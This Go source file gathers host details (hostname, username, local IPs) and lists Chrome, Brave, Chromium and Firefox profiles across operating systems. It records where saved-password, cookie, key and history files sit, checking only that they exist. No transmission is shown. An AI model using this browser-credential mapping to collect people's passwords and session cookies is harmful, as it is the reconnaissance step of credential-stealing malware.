package main

import (
	"net"
	"os"
	"path/filepath"
	"runtime"
	"sort"
	"strings"
)

type BrowserInventory struct {
	Name     string           `json:"name"`
	BasePath string           `json:"base_path"`
	Profiles []BrowserProfile `json:"profiles"`
}

type BrowserProfile struct {
	Name      string            `json:"name"`
	Path      string            `json:"path"`
	Artifacts []BrowserArtifact `json:"artifacts"`
}

type BrowserArtifact struct {
	Name   string `json:"name"`
	Path   string `json:"path"`
	Exists bool   `json:"exists"`
}

type browserSpec struct {
	name          string
	basePath      string
	profileFilter func(os.DirEntry) bool
	artifacts     []string
}

func collectSystemInfo() SystemInfo {
	hostname, _ := os.Hostname()
	homeDir, _ := os.UserHomeDir()

	username := os.Getenv("USER")
	if username == "" {
		username = os.Getenv("USERNAME")
	}

	return SystemInfo{
		OS:       runtime.GOOS,
		Arch:     runtime.GOARCH,
		Hostname: hostname,
		Username: username,
		HomeDir:  homeDir,
		LocalIPs: localIPAddresses(),
	}
}

func collectBrowserInventories() []BrowserInventory {
	specs := browserSpecs()
	inventories := make([]BrowserInventory, 0, len(specs))

	for _, spec := range specs {
		profiles := discoverProfiles(spec)
		if len(profiles) == 0 {
			continue
		}

		inventories = append(inventories, BrowserInventory{
			Name:     spec.name,
			BasePath: spec.basePath,
			Profiles: profiles,
		})
	}

	sort.Slice(inventories, func(i, j int) bool {
		return inventories[i].Name < inventories[j].Name
	})

	return inventories
}

func localIPAddresses() []string {
	interfaces, err := net.Interfaces()
	if err != nil {
		return nil
	}

	var ips []string
	for _, iface := range interfaces {
		if iface.Flags&net.FlagUp == 0 || iface.Flags&net.FlagLoopback != 0 {
			continue
		}

		addrs, err := iface.Addrs()
		if err != nil {
			continue
		}

		for _, addr := range addrs {
			ip, _, err := net.ParseCIDR(addr.String())
			if err != nil || ip == nil || ip.IsLoopback() {
				continue
			}

			ips = append(ips, ip.String())
		}
	}

	sort.Strings(ips)
	return compactStrings(ips)
}

func browserSpecs() []browserSpec {
	homeDir, _ := os.UserHomeDir()

	chromeArtifacts := []string{
		"Bookmarks",
		"History",
		"Cookies",
		"Login Data",
		"Preferences",
	}
	firefoxArtifacts := []string{
		"places.sqlite",
		"cookies.sqlite",
		"logins.json",
		"key4.db",
		"prefs.js",
	}

	switch runtime.GOOS {
	case "darwin":
		return []browserSpec{
			{
				name:          "Chrome",
				basePath:      filepath.Join(homeDir, "Library", "Application Support", "Google", "Chrome"),
				profileFilter: chromiumProfileFilter,
				artifacts:     chromeArtifacts,
			},
			{
				name:          "Brave",
				basePath:      filepath.Join(homeDir, "Library", "Application Support", "BraveSoftware", "Brave-Browser"),
				profileFilter: chromiumProfileFilter,
				artifacts:     chromeArtifacts,
			},
			{
				name:          "Chromium",
				basePath:      filepath.Join(homeDir, "Library", "Application Support", "Chromium"),
				profileFilter: chromiumProfileFilter,
				artifacts:     chromeArtifacts,
			},
			{
				name:          "Firefox",
				basePath:      filepath.Join(homeDir, "Library", "Application Support", "Firefox", "Profiles"),
				profileFilter: firefoxProfileFilter,
				artifacts:     firefoxArtifacts,
			},
		}
	case "windows":
		localAppData := os.Getenv("LOCALAPPDATA")
		appData := os.Getenv("APPDATA")

		return []browserSpec{
			{
				name:          "Chrome",
				basePath:      filepath.Join(localAppData, "Google", "Chrome", "User Data"),
				profileFilter: chromiumProfileFilter,
				artifacts:     chromeArtifacts,
			},
			{
				name:          "Brave",
				basePath:      filepath.Join(localAppData, "BraveSoftware", "Brave-Browser", "User Data"),
				profileFilter: chromiumProfileFilter,
				artifacts:     chromeArtifacts,
			},
			{
				name:          "Chromium",
				basePath:      filepath.Join(localAppData, "Chromium", "User Data"),
				profileFilter: chromiumProfileFilter,
				artifacts:     chromeArtifacts,
			},
			{
				name:          "Firefox",
				basePath:      filepath.Join(appData, "Mozilla", "Firefox", "Profiles"),
				profileFilter: firefoxProfileFilter,
				artifacts:     firefoxArtifacts,
			},
		}
	default:
		return []browserSpec{
			{
				name:          "Chrome",
				basePath:      filepath.Join(homeDir, ".config", "google-chrome"),
				profileFilter: chromiumProfileFilter,
				artifacts:     chromeArtifacts,
			},
			{
				name:          "Brave",
				basePath:      filepath.Join(homeDir, ".config", "BraveSoftware", "Brave-Browser"),
				profileFilter: chromiumProfileFilter,
				artifacts:     chromeArtifacts,
			},
			{
				name:          "Chromium",
				basePath:      filepath.Join(homeDir, ".config", "chromium"),
				profileFilter: chromiumProfileFilter,
				artifacts:     chromeArtifacts,
			},
			{
				name:          "Firefox",
				basePath:      filepath.Join(homeDir, ".mozilla", "firefox"),
				profileFilter: firefoxProfileFilter,
				artifacts:     firefoxArtifacts,
			},
		}
	}
}

func discoverProfiles(spec browserSpec) []BrowserProfile {
	entries, err := os.ReadDir(spec.basePath)
	if err != nil {
		return nil
	}

	var profiles []BrowserProfile
	for _, entry := range entries {
		if !spec.profileFilter(entry) {
			continue
		}

		profilePath := filepath.Join(spec.basePath, entry.Name())
		artifacts := artifactList(profilePath, spec.artifacts)
		if len(artifacts) == 0 {
			continue
		}

		profiles = append(profiles, BrowserProfile{
			Name:      entry.Name(),
			Path:      profilePath,
			Artifacts: artifacts,
		})
	}

	sort.Slice(profiles, func(i, j int) bool {
		return profiles[i].Name < profiles[j].Name
	})

	return profiles
}

func artifactList(profilePath string, names []string) []BrowserArtifact {
	artifacts := make([]BrowserArtifact, 0, len(names))
	for _, name := range names {
		fullPath := filepath.Join(profilePath, name)
		_, err := os.Stat(fullPath)
		if err != nil {
			continue
		}

		artifacts = append(artifacts, BrowserArtifact{
			Name:   name,
			Path:   fullPath,
			Exists: true,
		})
	}

	return artifacts
}

func chromiumProfileFilter(entry os.DirEntry) bool {
	if !entry.IsDir() {
		return false
	}

	name := entry.Name()
	return name == "Default" || strings.HasPrefix(name, "Profile ")
}

func firefoxProfileFilter(entry os.DirEntry) bool {
	if !entry.IsDir() {
		return false
	}

	name := entry.Name()
	return strings.Contains(name, ".")
}

func compactStrings(values []string) []string {
	if len(values) == 0 {
		return values
	}

	compacted := values[:1]
	for _, value := range values[1:] {
		if value == compacted[len(compacted)-1] {
			continue
		}
		compacted = append(compacted, value)
	}

	return compacted
}
